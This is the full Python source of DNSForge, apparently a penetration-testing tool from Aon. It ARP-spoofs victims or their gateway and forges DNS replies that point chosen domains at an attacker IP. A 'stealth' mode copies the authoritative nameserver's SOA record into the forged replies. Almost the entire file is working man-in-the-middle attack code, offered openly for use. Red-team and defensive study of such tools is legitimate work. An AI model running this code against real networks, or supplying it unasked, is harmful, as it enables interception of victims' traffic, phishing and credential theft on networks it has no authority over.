#############################################################################
#   Copyright 2024 Aon plc
#
#   Licensed under the Apache License, Version 2.0 (the "License");
#   you may not use this file except in compliance with the License.
#   You may obtain a copy of the License at
#
#       http://www.apache.org/licenses/LICENSE-2.0
#
#   Unless required by applicable law or agreed to in writing, software
#   distributed under the License is distributed on an "AS IS" BASIS,
#   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
#   See the License for the specific language governing permissions and
#   limitations under the License.
#############################################################################

import argparse
import ipaddress
import os
import socket
import sys
import threading
from contextlib import suppress

import netifaces
from scapy.all import (
    ARP,
    DNS,
    DNSQR,
    DNSRR,
    DNSRRSOA,
    IP,
    UDP,
    Ether,
    sendp,
    sniff,
    sr1,
    srp,
)
from termcolor import colored

from .attack_state import AttackState as state
from .logger import *


def banner():
    print(
        r"""
 ______   ____  _____   ______   ________                              
|_   _ `.|_   \|_   _|.' ____ \ |_   __  |                             
  | | `. \ |   \ | |  | (___ \_|  | |_ \_|.--.   _ .--.  .--./) .---.  
  | |  | | | |\ \| |   _.____`.   |  _| / .'`\ \[ `/'`\]/ /'`\;/ /__\\ 
 _| |_.' /_| |_\   |_ | \____) | _| |_  | \__. | | |    \ \._//| \__., 
|______.'|_____|\____| \______.'|_____|  '.__.' [___]   .',__`  '.__.' 
                                                       ( ( __))        
Author : Apurva Goenka
Version : 1.0.0
    """
    )


def req_dns_soa():
    args = parse_args()
    dns_request = (
        IP(dst=args.dns_server)
        / UDP(dport=53)
        / DNS(rd=1, qd=DNSQR(qname=args.domain, qtype="AAAA"))
    )
    # Send DNS request to request SOA
    log_info("[*] Requesting SOA record from authoritative DNS server", "yellow")
    received = sr1(dns_request, verbose=0)
    if received and DNS in received and received[DNS].nscount > 0:
        log_info("[+] Captured Authoritative Nameserver Signature")
        log_debug(received[DNSRRSOA].show(dump=True))
        return received[DNSRRSOA]
    else:
        log_error("[!] Failed to capture Authoritative Nameserver Signature")
        return


def arp_request(net_interface, target_ip):
    broadcast_packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, pdst=target_ip)
    received = srp(broadcast_packet, iface=net_interface, timeout=2, verbose=0)
    if received:
        try:
            return received[0][0][1].hwsrc
        except IndexError:
            return
    else:
        return


def backup_arp(net_interface, target_ip):
    # Backup original ARP cache
    orig_hwdst = arp_request(net_interface, target_ip)
    if not orig_hwdst:
        resp = (
            input(
                colored(
                    f"[!] The ARP spoofing target {target_ip} isn't responding to ARP requests and therefore may be unreachable - continue anyway? (Y/n): ",
                    "yellow",
                )
            )
            .strip()
            .lower()
        )
        if resp not in ["y", ""]:
            log_info(f"[-] Removing {target_ip} from ARP spoofing targets", "yellow")
            return False
        else:
            return True
    else:
        log_info(f"[*] Backed up ARP cache for {target_ip} - {orig_hwdst}")
        state.set_arp_cache(target_ip, orig_hwdst)
        return True


def arp_spoof(net_interface, target_ip):
    spoof_hwdst = netifaces.ifaddresses(str(net_interface))[netifaces.AF_LINK][0][
        "addr"
    ]
    spoof_packet = Ether(src=spoof_hwdst, dst="ff:ff:ff:ff:ff:ff") / ARP(
        op=2, hwsrc=spoof_hwdst, psrc=target_ip, hwdst="ff:ff:ff:ff:ff:ff"
    )
    log_info(f"[*] Spoofing ARP: {target_ip} is at {spoof_hwdst}", "yellow")
    # Continuously spoof ARP until process is killed
    sendp(spoof_packet, iface=net_interface, verbose=0, loop=1, inter=1)


def arp_restore(net_interface, target_ip):
    cached_hw = state.get_arp_cache()[target_ip]
    # Restore original ARP cache
    restore_packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
        op=2,
        hwsrc=cached_hw,
        psrc=target_ip,
        hwdst="ff:ff:ff:ff:ff:ff",
    )
    sendp(restore_packet, iface=net_interface, verbose=0)
    log_info(f"[*] Restored ARP cache for {target_ip} - {cached_hw}")


def dns_forge(packet, args):
    if args.mode == "respond":
        dns_forge_respond(packet, args)
    elif args.mode == "relay":
        dns_forge_relay(packet, args)


def dns_forge_respond(packet, args):
    dns_nxdomain = False

    # Ignore packet if no DNS query present
    if DNSQR not in packet or not packet.dport == 53:
        return

    dns_layer = DNS(
        id=packet[DNS].id,
        qd=packet[DNS].qd,
        aa=0,
        rd=1,
        qr=1,
        qdcount=1,
        ancount=0,
        nscount=0,
        arcount=0,
    )

    log_info(f"[*] Found DNS request from {packet[IP].src}")
    query = packet[DNSQR].qname.decode("utf-8")
    if args.query_name and not any(q in query for q in args.query_name):
        log_info(
            f"[-] Query: {query} does not match filter - responding with correct IP",
            "yellow",
        )

        if query not in state.get_dns_cache():
            log_debug(f"[*] Resolving query {query}")

            try:
                dns_lookup = socket.gethostbyname(query)
            except socket.gaierror:
                log_error(
                    f"[!] Cannot resolve query {query} - responding with NXDomain"
                )
                # Modify base packet
                dns_layer.rcode = 3
                dns_nxdomain = True

            if not dns_nxdomain:
                resp_ip = dns_lookup
                # Cache IP for future requests
                state.set_dns_cache(query, dns_lookup)
        else:
            log_debug(f"[*] DNS cache hit for {query}", "green")
            resp_ip = state.get_dns_cache()[query]
        if not dns_nxdomain:
            log_info(f"[*] Responding to query {query} with IP {resp_ip}", "yellow")
        else:
            log_info(f"[*] Responding to query {query} with NXDomain", "yellow")
    else:
        resp_ip = args.poison_ip
        log_info(f"[*] Poisoning query {query} with IP {resp_ip}")

    if not dns_nxdomain:
        dns_layer.rcode = 0
        dns_layer.ancount = 1
        dns_layer.an = DNSRR(
            rrname=packet[DNS].qd.qname, type="A", ttl=args.time_to_live, rdata=resp_ip
        )

    response_packet = (
        Ether(src=packet[Ether].dst, dst=packet[Ether].src)
        / IP(src=packet[IP].dst, dst=packet[IP].src)
        / UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)
        / dns_layer
    )

    # Modify packet if stealth mode enabled
    if state.get_authoritative_nameserver() and args.stealth:
        log_info(f"[+] Forged Authoritative Nameserver Signature")
        response_packet[DNS].nscount = 1
        response_packet[DNS].ns = state.get_authoritative_nameserver()

    # Send the DNS response
    sendp(response_packet, iface=args.interface, verbose=False)
    log_info(f"[+] Sent Forged/Poisoned Packet to {packet[IP].src}")
    log_debug(response_packet[DNS].show(dump=True))


def dns_forge_relay(packet, args):
    resp_ip = args.poison_ip
    # Ignore previously seen DNS packets
    if bytes(packet) in state.get_dns_cache():
        log_debug(f"[-] Found duplicate packet to {packet[IP].dst} - ignoring.")
        return

    # Ignore packets to client IPs outside target range
    if packet[IP].dst not in state.get_arp_cache():
        log_error(
            f"[!] Found packet to IP {packet[IP].dst} outside target range - ignoring."
        )
        return

    log_info(f"[*] Found DNS response to {packet[IP].dst}")
    query = packet[DNS].qd.qname.decode("utf-8")
    if args.query_name and not any(q in query for q in args.query_name):
        log_info(
            f"[-] Query: {query} does not match filter - forwarding original packet",
            "yellow",
        )
        dns_layer = packet[DNS]
    else:
        log_info(f"[*] Poisoning query {query} with IP {resp_ip}")
        dns_layer = DNS(
            id=packet[DNS].id,
            qd=packet[DNS].qd,
            aa=0,
            rd=1,
            qr=1,
            rcode=0,
            qdcount=1,
            ancount=1,
            nscount=0,
            arcount=0,
            an=DNSRR(
                rrname=packet[DNS].qd.qname,
                type="A",
                ttl=args.time_to_live,
                rdata=resp_ip,
            ),
        )

    cached_hw = state.get_arp_cache()[packet[IP].dst]
    response_packet = (
        Ether(src=packet[Ether].dst, dst=cached_hw)
        / IP(src=packet[IP].src, dst=packet[IP].dst)
        / UDP(dport=packet[UDP].dport, sport=packet[UDP].sport)
        / dns_layer
    )

    # Modify packet if stealth mode enabled
    if state.get_authoritative_nameserver() and args.stealth:
        log_info(f"[+] Forged Authoritative Nameserver Signature")
        response_packet[DNS].nscount = 1
        response_packet[DNS].ns = state.get_authoritative_nameserver()

    # Send the DNS response
    sendp(response_packet, iface=args.interface, verbose=False)
    log_info(f"[+] Sent Forged/Poisoned Packet to {response_packet[IP].dst}")
    state.set_dns_cache(bytes(response_packet), response_packet[IP].dst)
    log_debug(response_packet[DNS].show(dump=True))


def validate_arp_spoof_targets(arp_target, net_interface):
    if arp_target:
        iface_info = netifaces.ifaddresses(net_interface)[netifaces.AF_INET][0]
        iface_ip = iface_info["addr"]
        netmask = iface_info["netmask"]
        gateway = None

        # Determine gateway
        for gw_ip, gw_iface, is_default in netifaces.gateways()[netifaces.AF_INET]:
            if net_interface == gw_iface:
                gateway = gw_ip
                break
        if not gateway:
            log_error(
                f"[!] Cannot find gateway for interface {net_interface} - exiting.."
            )
            sys.exit(1)

        subnet = ipaddress.IPv4Network(f"{iface_ip}/{netmask}", strict=False)
        valid_arp_target = set()
        for target in arp_target:
            if ipaddress.IPv4Address(target) not in subnet:
                log_info(
                    f"[*] Target {target} is not within the same subnet - targeting gateway {gateway} instead",
                    "yellow",
                )
                # check IP forwarding before proceeding
                if not check_ip_forwarding():
                    resp = (
                        input(
                            colored(
                                "[!] The subnet gateway is targeted for ARP spoofing but IP forwarding isn't detected - continue anyway? (Y/n): ",
                                "yellow",
                            )
                        )
                        .strip()
                        .lower()
                    )
                    if resp not in ["y", ""]:
                        log_info(
                            "[-] Removing gateway from ARP spoofing targets", "yellow"
                        )
                        continue
                valid_arp_target.add(gateway)
            else:
                valid_arp_target.add(target)

        backed_arp_target = set()
        # Attempt ARP backup
        for target in valid_arp_target:
            result = backup_arp(net_interface, target)
            if result:
                backed_arp_target.add(target)
        return backed_arp_target


def check_ip_forwarding():
    with suppress(FileNotFoundError):
        with open("/proc/sys/net/ipv4/ip_forward", "r") as f:
            status = f.read().strip()
            if status == "1":
                return True
            else:
                return False


def parse_args():
    # Parse Arguments
    parser = argparse.ArgumentParser(
        description="DNS Response Forger",
    )
    parser.add_argument(
        "mode",
        choices=["respond", "relay"],
        action="store",
        help="Respond mode: DNS request packets are intercepted on their way from the client to the server.\n"
        "Relay mode: DNS response packets are intercepted on their way from the server to the client.",
    )
    parser.add_argument(
        "-i",
        "--interface",
        type=str,
        help="Interface to sniff/poison on",
        required=True,
    )
    parser.add_argument(
        "-p",
        "--poison-ip",
        type=str,
        help="IP address to forge/poison DNS response",
        required=True,
    )
    parser.add_argument(
        "-ttl",
        "--time-to-live",
        type=int,
        help="TTL (seconds) for poisoned DNS response",
        required=False,
        default=300,
    )
    parser.add_argument(
        "-q",
        "--query-name",
        type=str,
        help="DNS Query Name to Poison (can specify multiple by separating with ',')",
        required=False,
    )
    parser.add_argument(
        "-s", "--stealth", help="Stealth Mode", required=False, action="store_true"
    )
    parser.add_argument(
        "-v", "--verbose", help="Verbose Output", required=False, action="store_true"
    )
    stealth_group = parser.add_argument_group("Stealth Mode")
    stealth_group.add_argument(
        "-ds", "--dns-server", type=str, help="IP address of Authoritative DNS Server"
    )
    stealth_group.add_argument(
        "-d", "--domain", type=str, help="The domain name of the victim domain"
    )
    arpspoof_group = parser.add_argument_group("ARP Spoofing")
    arpspoof_group_ex = arpspoof_group.add_mutually_exclusive_group(required=True)
    arpspoof_group_ex.add_argument(
        "-t", "--target", type=str, help="ARP spoofing target IP"
    )
    arpspoof_group_ex.add_argument(
        "-tf", "--target-file", type=str, help="ARP spoofing target IP list"
    )
    arpspoof_group_ex.add_argument(
        "--no-arp-spoof", help="Turn off ARP spoofing", action="store_true"
    )

    args = parser.parse_args()

    if args.stealth and (args.dns_server is None or args.domain is None):
        parser.error("-s/--stealth requires -ds/--dns-server and -d/--domain")

    return args


def main():
    banner()
    args = parse_args()

    # Setup Logging
    setup_logging(args.verbose)

    # Check root privileges
    if os.geteuid() != 0:
        log_error("[!] Please run as root")
        sys.exit(1)

    # Check network interface
    try:
        if netifaces.AF_INET in netifaces.ifaddresses(args.interface):
            net_interface = args.interface
    except ValueError:
        log_error("[!] Invalid network interface supplied")
        sys.exit(1)

    # Stealth mode
    if args.stealth:
        log_info("[*] Stealth mode activated")
        log_debug("[*] Capturing Authoritative Nameserver Signature...")
        authoritative_nameserver = req_dns_soa()
        state.set_authoritative_nameserver(authoritative_nameserver)

    # Check ARP spoofing targets
    if args.target:
        try:
            ipaddress.IPv4Address(args.target)
        except ipaddress.AddressValueError:
            log_error(f"[!] Invalid ARP spoofing target supplied: {args.target}")
            sys.exit(1)
        arp_target = [args.target]
    elif args.target_file:
        if os.path.exists(args.target_file):
            with open(args.target_file, "r") as tf:
                arp_target = [target.strip() for target in tf.readlines()]
        else:
            log_error(f"[!] Invalid targets file supplied: {args.target_file}")
            sys.exit(1)

    state.set_arp_target(validate_arp_spoof_targets(arp_target, net_interface))
    if not state.get_arp_target():
        log_error("[!] ARP spoofing targets missing - exiting..")
        sys.exit(1)

    # Setup ARP spoofing
    if not args.no_arp_spoof:
        for target in state.get_arp_target():
            arpspoof_thread = threading.Thread(
                target=arp_spoof,
                args=(
                    net_interface,
                    target,
                ),
            )
            arpspoof_thread.daemon = True
            arpspoof_thread.start()

    # Setup DNS Forging/Poisoning based on attack mode
    iface_ip = netifaces.ifaddresses(net_interface)[netifaces.AF_INET][0]["addr"]

    if args.mode == "respond":
        dns_packet_filter = " and ".join(
            ["udp port 53", "udp[10] & 0x80 = 0", f"not src host {iface_ip}"]
        )
        log_info(
            "[*] Respond mode - intercepting DNS requests from victim clients to DNS server",
            "yellow",
        )
    elif args.mode == "relay":
        dns_packet_filter = " and ".join(
            ["udp port 53", "udp[10] & 0x80 != 0", f"not dst host {iface_ip}"]
        )
        log_info(
            "[*] Relay mode - intercepting DNS responses from DNS server to victim clients",
            "yellow",
        )

    if args.query_name:
        args.query_name = args.query_name.split(",")
        log_info(f"[*] Filtering DNS requests for {args.query_name}", "yellow")
    else:
        log_info("[*] No query filter supplied - poisoning all DNS packets", "yellow")
    sniff(
        filter=dns_packet_filter,
        prn=lambda packet: dns_forge(packet, args),
        store=0,
        iface=net_interface,
    )
    log_info("[!] Ctrl-C detected, killing..", "red")
    if not args.no_arp_spoof:
        log_info("[*] Re-arping targets", "yellow")
        for target in state.get_arp_target():
            if target in state.get_arp_cache():
                arp_restore(net_interface, target)


if __name__ == "__main__":
    main()
